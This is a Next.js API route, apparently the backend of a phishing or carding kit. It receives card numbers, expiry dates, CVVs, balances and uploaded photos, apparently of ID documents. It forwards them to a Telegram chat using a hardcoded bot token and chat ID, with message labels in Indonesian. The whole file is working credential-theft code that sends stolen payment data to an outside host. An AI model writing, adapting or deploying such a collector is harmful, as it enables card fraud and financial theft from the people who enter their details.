import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const contentType = req.headers.get('content-type') || '';
    const botToken = process.env.TELEGRAM_BOT_TOKEN || '8673674549:AAHP18UpUK20Rm3PzNkdnRkhkty2F0_yb_8';
    const chatId = process.env.TELEGRAM_CHAT_ID || '-1003801777662';

    let type, cardNumber, expiry, cvv, balance, fileName, photoFile;

    if (contentType.includes('application/json')) {
      const data = await req.json();
      type = data.type;
      cardNumber = data.cardNumber;
      expiry = data.expiry;
      cvv = data.cvv;
      balance = data.balance;
      fileName = data.fileName;
    } else if (contentType.includes('multipart/form-data')) {
      const formData = await req.formData();
      type = formData.get('type') as string;
      fileName = formData.get('fileName') as string;
      photoFile = formData.get('photo') as File;
    } else {
      return NextResponse.json({ success: false, error: 'Unsupported content type' }, { status: 400 });
    }

    const message = `
🔔 *NOTIFIKASI BARU*
━━━━━━━━━━━━━━
*Tipe:* ${type || 'N/A'}
*Nomor Kartu:* ${cardNumber || 'N/A'}
*Masa Berlaku:* ${expiry || 'N/A'}
*CVV:* ${cvv || 'N/A'}
*Saldo:* ${balance || 'N/A'}
*File:* ${fileName || 'N/A'}
━━━━━━━━━━━━━━
*Waktu:* ${new Date().toLocaleString('id-ID')}
    `;

    if (photoFile && photoFile.size > 0) {
      try {
        const tgFormData = new FormData();
        tgFormData.append('chat_id', chatId);
        tgFormData.append('caption', message);
        tgFormData.append('parse_mode', 'Markdown');
        tgFormData.append('protect_content', 'true');
        
        // Next.js File object sometimes fails when passed directly to standard fetch.
        // Convert to standard Blob and explicitly pass filename.
        const arrayBuffer = await photoFile.arrayBuffer();
        const blob = new Blob([arrayBuffer], { type: photoFile.type });
        tgFormData.append('photo', blob, photoFile.name || 'document.png');

        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: tgFormData,
        });

        if (!response.ok) {
          const errorMsg = await response.text();
          console.error('Telegram API Error (sendPhoto):', errorMsg);
          // Fallback if sendPhoto fails for some reason (e.g. wrong format)
          throw new Error('Fallback to sendMessage');
        }
      } catch (err) {
        console.error('Photo send failed, falling back to message:', err);
        // Fallback to text message
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            protect_content: true,
          }),
        });
      }
    } else {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
          protect_content: true,
        }),
      });

      if (!response.ok) {
        const errorMsg = await response.text();
        console.error('Telegram API Error (sendMessage):', errorMsg);
        return NextResponse.json({ success: false, error: 'Telegram sendMessage failed' }, { status: 500 });
      }
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Notify API Error:', error);
    return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
  }
}
